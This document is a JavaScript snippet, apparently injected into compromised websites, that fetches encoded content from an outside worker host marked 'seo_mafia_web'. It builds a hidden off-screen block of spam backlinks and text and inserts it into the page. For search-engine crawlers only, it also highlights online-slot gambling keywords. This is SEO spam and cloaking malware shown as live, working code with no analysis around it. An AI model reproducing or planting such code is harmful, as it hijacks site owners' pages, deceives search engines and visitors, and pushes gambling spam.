!function(){
try{
if(document.getElementById("bunker-payload")) return;
const decode = s => decodeURIComponent(escape(atob(s)));
Promise.all([
fetch("https://smw.jsload.workers.dev/data?id=b1&token=seo_mafia_web")
.then(r=>r.json())
.then(j=>j && j.payload ? decode(j.payload) : ""),
fetch("https://smw.jsload.workers.dev/data?id=a1&token=seo_mafia_web")
.then(r=>r.json())
.then(j=>j && j.payload ? decode(j.payload) : "")
]).then(res=>{
var anchorsRaw = res[0],
    articleRaw = res[1];
if(!anchorsRaw || !articleRaw) return;
var anchors = anchorsRaw
.split("\n")
.filter(Boolean)
.map(x=>{
  var p=x.split("|");
  return p.length>1 ? '<a href="'+p[1].trim()+'">'+p[0].trim()+"</a>" : "";
})
.filter(Boolean);
var i=0;
var html = articleRaw.replace(/{ANCHOR}/g,()=>anchors.length ? anchors[i++%anchors.length] : "");
var box=document.createElement("div");
box.id="bunker-payload";
box.style.cssText="position:absolute;left:-9999px;width:1px;height:1px;overflow:hidden";
box.innerHTML=html;
(document.body||document.documentElement).appendChild(box);
if(!/googlebot|bingbot|ahrefs|semrush|mj12|yandex|duckduckbot/i.test(navigator.userAgent))
return;
var s=document.createElement("script");
s.src="https://cdn.jsdelivr.net/npm/mark.js@8.11.1/dist/mark.min.js";
s.onload=function(){
new Mark(box).mark(["Slot Gacor","slot online","rtp slot"],{
separateWordSearch:false,
accuracy:"partially"
});
};
document.head.appendChild(s);
});
}catch(e){}
}();
